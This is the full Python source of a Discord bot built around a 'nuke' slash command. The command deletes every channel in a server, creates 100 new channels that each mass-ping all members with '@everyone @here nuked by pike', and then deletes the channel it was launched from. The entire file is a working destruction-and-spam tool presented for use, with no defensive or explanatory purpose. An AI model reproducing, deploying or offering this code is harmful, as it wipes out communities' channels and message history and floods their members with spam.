import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import logging
import os

# ── Logging ───────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler()]
)
log = logging.getLogger(__name__)

# ── Bot setup ─────────────────────────────────────────────────────────────────
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True

bot = commands.Bot(command_prefix="!", intents=intents)

# ── Events ────────────────────────────────────────────────────────────────────

@bot.event
async def on_ready():
    await bot.tree.sync()
    log.info(f"Logged in as {bot.user} (ID: {bot.user.id})")

# ── Slash commands ────────────────────────────────────────────────────────────

@bot.tree.command(name="nuke", description="Nuke the server.")
@app_commands.default_permissions(administrator=True)
async def nuke(interaction: discord.Interaction):
    guild = interaction.guild
    origin = interaction.channel

    await interaction.response.send_message("💣 Nuking...", ephemeral=True)

    # Step 1: Delete all channels except origin
    for channel in guild.channels:
        if channel == origin:
            continue
        try:
            await channel.delete(reason="Nuked")
            await asyncio.sleep(1.0)
        except (discord.HTTPException, discord.Forbidden):
            pass

    # Step 2: Create 100 #nuked channels and spam @everyone @here
    for i in range(100):
        try:
            new_ch = await guild.create_text_channel("nuked")
            await new_ch.send("@everyone @here nuked by pike")
            await asyncio.sleep(0.5)
        except (discord.HTTPException, discord.Forbidden):
            pass

    # Step 3: Delete origin channel last
    await asyncio.sleep(1.0)
    try:
        await origin.delete(reason="Nuked")
    except (discord.HTTPException, discord.Forbidden):
        pass

    log.info(f"Server {guild.name} nuked by {interaction.user}")

    # Step 4: DM the user to confirm completion
    try:
        await interaction.user.send("✅ Nuke complete.")
    except discord.Forbidden:
        pass


# ── Entry point ───────────────────────────────────────────────────────────────

if __name__ == "__main__":
    token = os.environ.get("DISCORD_TOKEN")
    if not token:
        raise RuntimeError("Set the DISCORD_TOKEN environment variable.")
    bot.run(token)
